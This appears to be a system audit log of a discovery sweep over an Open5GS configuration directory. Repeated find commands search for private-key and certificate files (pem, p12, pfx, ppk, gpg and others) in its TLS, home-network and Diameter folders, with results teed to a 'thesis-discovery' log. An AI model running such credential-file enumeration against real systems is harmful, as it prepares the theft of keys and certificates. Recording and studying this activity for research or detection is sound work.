+2026-10-02T20:15:54.090024789Z | EXEC | PID=974267 | PPID=974265 | /usr/bin/tee | -a /tmp/thesis-discovery.log
+2026-10-02T20:15:54.091883033Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.091904762Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.091925597Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.091932084Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.091941372Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.091961428Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.092015077Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.092031790Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.092053035Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.092069553Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.092086160Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.092110171Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.092180878Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.092196Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.092217116Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.092228571Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.092244166Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.092274079Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.092334965Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.092375087Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.092394962Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.092402895Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.092411604Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.092430214Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.092496077Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.092511892Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.092539655Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.092548324Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.092566499Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.092593673Z | READ | PID=974268 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.093481303Z | EXEC | PID=974269 | PPID=974266 | /usr/bin/find | /opt/open5gs/etc -maxdepth 3 -name *.pgp
+2026-10-02T20:15:54.095122961Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.095143861Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.095159089Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.095163980Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.095170954Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.095184056Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.095233609Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.095240572Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.095258816Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.095263449Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.095281126Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.095303349Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.095419320Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.095436696Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.095455320Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.095467486Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.095485780Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.095516401Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.095573997Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.095581278Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.095602768Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.095615161Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.095630001Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.095648839Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.095698287Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.095714486Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.095738406Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.095749953Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.095773829Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.095798896Z | READ | PID=974269 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.096603999Z | EXEC | PID=974270 | PPID=974266 | /usr/bin/find | /opt/open5gs/etc -maxdepth 3 -name *.gpg
+2026-10-02T20:15:54.098235886Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.098208233Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.098217447Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.098222637Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.098228052Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.098242278Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.098297936Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.098314004Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.098330101Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.098336615Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.098373773Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.098403960Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.098465952Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.098480721Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.098496020Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.098507055Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.098519158Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.098541203Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.098598531Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.098606115Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.098615878Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.098620949Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.098636742Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.098654647Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.098710044Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.098719049Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.098740606Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.098744952Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.098763106Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.098780410Z | READ | PID=974270 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.099553979Z | EXEC | PID=974271 | PPID=974266 | /usr/bin/find | /opt/open5gs/etc -maxdepth 3 -name *.ppk
+2026-10-02T20:15:54.101176538Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.101196478Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.101207616Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.101212305Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.101219312Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.101243074Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.101297713Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.101313351Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.101330Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.101342463Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.101381528Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.101411971Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.101473212Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.101488576Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.101505586Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.101516388Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.101530043Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.101557876Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.101612778Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.101627803Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.101637719Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.101642284Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.101649586Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.101667257Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.101722251Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.101737413Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.101760437Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.101771813Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.101789116Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.101813597Z | READ | PID=974271 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.102603622Z | EXEC | PID=974272 | PPID=974266 | /usr/bin/find | /opt/open5gs/etc -maxdepth 3 -name *.p12
+2026-10-02T20:15:54.104272687Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.104293088Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.104311752Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.104315624Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.104361546Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.104334132Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.104411806Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.104419558Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.104435804Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.104440603Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.104455086Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.104477101Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.104539425Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.104554154Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.104569515Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.104574163Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.104587324Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.104609405Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.104679493Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.104687659Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.104706738Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.104712412Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.104719923Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.104731901Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.104780312Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.104787178Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.104811065Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.104815436Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.104831731Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.104849805Z | READ | PID=974272 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.105730945Z | EXEC | PID=974273 | PPID=974266 | /usr/bin/find | /opt/open5gs/etc -maxdepth 3 -name *.pem
+2026-10-02T20:15:54.108840937Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.108861282Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.108874225Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.108887022Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.108893654Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.108906767Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.108955321Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.108962663Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.108980643Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.108985716Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.108997410Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.109018235Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.109102847Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.109236315Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.109136Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.109147450Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.109165939Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.109187103Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.109233910Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.109249401Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.109265331Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.109275569Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.109285233Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.109296570Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.109344337Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.109368998Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.109399402Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.109410914Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.109434017Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.109630002Z | READ | PID=974273 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.110606837Z | EXEC | PID=974274 | PPID=974266 | /usr/bin/find | /opt/open5gs/etc -maxdepth 3 -name *.pfx
+2026-10-02T20:15:54.115250739Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.115272709Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.115283902Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.115289208Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.115295279Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.115309298Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.115394193Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.115403127Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.115422200Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.115427542Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.115440672Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.115465800Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.115519237Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.115526657Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.115541334Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.115545754Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.115560337Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.115582424Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.115628192Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.115722469Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.115645249Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.115649871Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.115657237Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.115668409Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.115720124Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.115726763Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.115755016Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.115759885Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.115778514Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.115795972Z | READ | PID=974274 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.117955257Z | EXEC | PID=974275 | PPID=974266 | /usr/bin/find | /opt/open5gs/etc -maxdepth 3 -name *.cer
+2026-10-02T20:15:54.120059218Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.120079697Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.120090267Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.120095046Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.120101193Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.120113688Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.120163374Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.120170818Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.120186695Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.120191184Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.120203444Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.120224098Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.120274558Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.120281222Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.120295639Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.120299933Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.120311098Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.120332013Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs
+2026-10-02T20:15:54.120406113Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.120413710Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.120423507Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.120428599Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.120436050Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.120446847Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs/hnet
+2026-10-02T20:15:54.120499531Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.120506131Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.120526705Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.120532118Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.120551376Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.120568881Z | READ | PID=974275 | /usr/bin/find | /opt/open5gs/etc/open5gs/tls
+2026-10-02T20:15:54.121457637Z | EXEC | PID=974276 | PPID=974266 | /usr/bin/find | /opt/open5gs/etc -maxdepth 3 -name *.p7b
+2026-10-02T20:15:54.123432246Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.123455014Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.123478900Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.123485149Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.123493287Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.123515755Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc
+2026-10-02T20:15:54.123576604Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.123593732Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.123624956Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.123654830Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.123707334Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
+2026-10-02T20:15:54.123747241Z | READ | PID=974276 | /usr/bin/find | /opt/open5gs/etc/freeDiameter
